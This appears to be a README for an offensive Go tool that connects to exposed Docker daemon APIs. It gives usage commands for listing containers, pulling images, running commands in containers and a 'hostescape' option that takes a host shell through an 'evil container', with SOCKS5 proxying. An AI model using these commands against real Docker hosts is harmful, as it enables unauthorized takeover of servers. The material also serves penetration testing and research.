# Docker-Api-Tool
A command-line interface (CLI) tool for interacting with the Docker Daemon API via the Docker Go SDK, supporting various operations including container management, image pulling, and escaping to host shell by creating an evil container. It also features SOCKS5 proxy support for flexible network configurations.

## Usage
```shell
$ ./Docker-Api-Tool -h
   ___             __                   ___          _      ______            __
  / _ \ ___  ____ / /__ ___  ____ ____ / _ |  ___   (_)____/_  __/___  ___   / /
 / // // _ \/ __//  '_// -_)/ __//___// __ | / _ \ / //___/ / /  / _ \/ _ \ / / 
/____/ \___/\__//_/\_\ \__//_/       /_/ |_|/ .__//_/      /_/   \___/\___//_/  
                                           /_/                                  
                                                        v0.0.1          By itSssm3
Usage:
  Docker-Api-Tool [flags]
  Docker-Api-Tool [command]

Available Commands:
  check       Check DockerApi connection
  execctr     Exec command in an existing container
  help        Help about any command
  hostescape  Escape to HOST by creating an evil container
  listall     List all containers and images
  pullimage   Pull a new image

Flags:
  -h, --help               help for Docker-Api-Tool
      --proxyaddr string   Set proxy: socks5://127.0.0.1:6666 (optional)

Use "Docker-Api-Tool [command] --help" for more information about a command.
```

## check
```shell
(default clientversion - 1.49)
$ ./Docker-Api-Tool check --address tcp://127.0.0.1:2375
```

## listall
```shell
$ ./Docker-Api-Tool listall --address tcp://127.0.0.1:2375
```

## pullimage
```shell
(default imagename - ubuntu:latest)
$ ./Docker-Api-Tool pullimage --address tcp://127.0.0.1:2375
$ ./Docker-Api-Tool pullimage --address tcp://127.0.0.1:2375 --imagename mysql
```

## execctr
```shell
(default command - id)
$ ./Docker-Api-Tool execctr --address tcp://127.0.0.1:2375
$ ./Docker-Api-Tool execctr --address tcp://127.0.0.1:2375 --containerid a4c --command "ls -al"
$ ./Docker-Api-Tool execctr --address tcp://127.0.0.1:2375 --containerid hello-test --command "ls -al"
```

## hostescape
```shell
(default imagename - ubuntu:latest)
$ ./Docker-Api-Tool hostescape --address tcp://127.0.0.1:2375
$ ./Docker-Api-Tool hostescape --address tcp://127.0.0.1:2375 --imagename mysql
```

## with proxyaddr
```shell
$ ./Docker-Api-Tool check --address tcp://127.0.0.1:2375 --proxyaddr socks5://192.200.200.1:6666
```

# Download


# License
This project is licensed under the MIT License.

## **For technical research only, please do not use it for illegal purposes, otherwise the author will not be responsible for the consequences.**